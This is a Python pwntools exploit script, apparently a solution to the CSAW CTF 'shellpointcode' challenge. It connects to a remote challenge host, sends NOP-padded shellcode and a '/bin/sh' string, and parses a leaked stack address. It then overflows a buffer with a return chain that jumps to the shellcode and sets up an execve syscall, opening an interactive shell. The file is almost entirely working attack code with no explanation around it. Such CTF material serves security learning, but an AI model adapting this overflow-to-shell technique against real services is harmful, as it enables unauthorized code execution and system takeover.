#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('shellpointcode')

host = args.HOST or 'pwn.chal.csaw.io'
port = int(args.PORT or 9005)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

# -- Exploit goes here --

context.terminal = ['gnome-terminal', '-e']
io = start()

def nop_pad(string, size):
    return string + (size - len(string)) * '\x90'

with open('shellcode64', 'rb') as f:
    shellcode = f.read()

# the shellcode
stage1 = nop_pad(shellcode, 15)

# bin sh string
binsh = int(''.join("2f 62 69 6e 2f 73 68 00".split(' ')[::-1]), 16)
stage2 = "A" * 8 + p64(binsh) # align first + binsh

io.sendlineafter(':', stage1)
io.sendlineafter(':', stage2)
io.recvuntil('next: ')

offset = 40
addr = int(io.recvline().strip(), 16) + offset
log.info(hex(addr))

# ROP
rop_chain = p64(addr) + p64(0x3b) # the last value is used by pop rax to get the system call number

# fill + rbp + rip (rop chain)
payload = "AAA" + 8 * "A" + rop_chain
io.sendlineafter('?', payload)

io.interactive()

